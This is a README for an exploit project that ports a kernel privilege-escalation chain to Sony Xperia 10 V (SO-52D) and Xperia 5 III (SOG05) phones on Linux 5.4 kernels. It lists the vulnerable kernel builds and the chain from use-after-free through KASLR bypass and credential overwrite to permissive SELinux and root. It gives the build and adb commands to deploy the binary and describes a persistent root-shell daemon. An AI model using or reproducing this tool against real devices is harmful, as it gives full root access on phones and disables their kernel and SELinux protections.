# ghostlock_5.4_xperia

Ported from [GhostLock-H80GT](https://github.com/yakidango-official/GhostLock-H80GT)
to Sony Xperia 5.4 kernels. The tree keeps the SO-52D target and adds the
SOG05 (Xperia 5 III, KDDI) target.

## Targets

| Project | Device | SoC | Kernel |
| --- | --- | --- | --- |
| `so52d-5.4.295` | Sony Xperia 10 V, docomo SO-52D | Qualcomm SM6375 | `5.4.295-qgki-g1da550e1d37c` |
| `sog05-5.4.210` | Sony Xperia 5 III, KDDI SOG05 | Qualcomm SM8350 | `5.4.210-qgki-g55a0c74ba38a` |

5.4 chain: `UAF → KASLR → arbitrary R/W → cred → SELinux permissive → root`.

## Build

```sh
make -C exploit list-projects
make -C exploit PROJECT=sog05-5.4.210 NDK_ROOT="$NDK" -j2 bin
```

The static binary is `exploit/build/<project>/bin/exploit_static`.

## Run (SOG05)

```sh
adb push exploit/build/sog05-5.4.210/bin/exploit_static /data/local/tmp/gl
adb shell 'chmod 755 /data/local/tmp/gl; /data/local/tmp/gl >/data/local/tmp/gl.log 2>&1'
```

The working chain and timings are baked into the target's
`env_defaults.h`; they can still be overridden with environment variables.
The parent may report a failed walk while the parked anchor is still about to
flip; check the log for `anchor: ROOT` / `su: root daemon forked`.

## su runtime

The exploit binary is also the su client. During startup it creates
`/data/local/tmp/su` as a symlink to itself and prepares an abstract Unix
socket. Once the parked anchor has root **and SELinux is permissive**, it
forks the daemon; the daemon serves an interactive root shell or one-shot
commands:

```sh
/data/local/tmp/su                 # interactive root shell
/data/local/tmp/su -c id           # one-shot command
/data/local/tmp/su -c 'cat /sys/fs/selinux/enforce'
```

The daemon is `gl_su_rootd` and survives until reboot. Re-running the
exploit is a no-op if the service is already up. Do not kill the parked
anchor processes; its borrowed `init_cred` pointer has no matching
refcounts. A reboot is the clean reset.
